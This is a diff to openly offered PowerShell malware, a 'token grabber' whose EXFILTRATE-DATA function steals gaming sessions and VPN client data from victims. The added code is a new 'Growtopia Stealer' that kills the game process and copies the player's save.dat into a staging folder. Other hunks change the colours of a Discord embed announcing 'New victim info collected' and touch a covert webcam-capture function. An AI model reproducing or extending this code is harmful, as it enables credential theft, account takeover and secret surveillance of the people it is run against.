@@ -250,7 +250,19 @@ function EXFILTRATE-DATA {
             $eafolder = "$env:localappdata\Electronic Arts"
             Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
-    electronic_arts    
+    electronic_arts  
+
+   # Growtopia Stealer
+   function growtopiastealer {
+               $processname = "growtopia"
+               try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+               $growtopia_session = "$gaming_sessions\Growtopia"
+               New-Item -ItemType Directory -Force -Path $growtopia_session
+               $growtopiafolder = "$env:localappdata\Growtopia"
+               Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
+       
+   }
+   growtopiastealer	
 	
 	# All VPN Clients
 	New-Item -Path "$env:localappdata\Temp" -Name "VPN Clients" -ItemType Directory -force | out-null
@@ -498,7 +510,7 @@ function EXFILTRATE-DATA {
         "content" = "@everyone"
         "title" = "KDOT"
         "description" = "Powerful Token Grabber"
-        "color" = "16711680"
+        "color" = "3447003"
         "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
         "url" = "https://discord.gg/vk3rBhcj2y"
         "embeds" = @(
@@ -506,7 +518,7 @@ function EXFILTRATE-DATA {
                 "title" = "POWERSHELL GRABBER"
                 "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
                 "description" = "New victim info collected !"
-                "color" = "16711680"
+                "color" = "3447003"
                 "footer" = @{
                     "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                 }
@@ -652,9 +664,7 @@ function EXFILTRATE-DATA {
 }
 
 function Get-WebCamImage {
-    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
-    # he did 99% of the work
-    # other 1% modified by KDot227
+    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1, he did 99% of the work the other 1% modified by KDot227
     # had to half learn c# to figure anything out (I still don't understand it)
     $source=@" 
     using System; 
@@ -782,7 +792,7 @@ function Get-WebCamImage {
     
                 return (Device[])devices.ToArray(typeof(Device)); 
             } 
-    
+			
             public static Device GetDevice(int deviceIndex) 
             { 
                 return (Device)devices[deviceIndex]; 
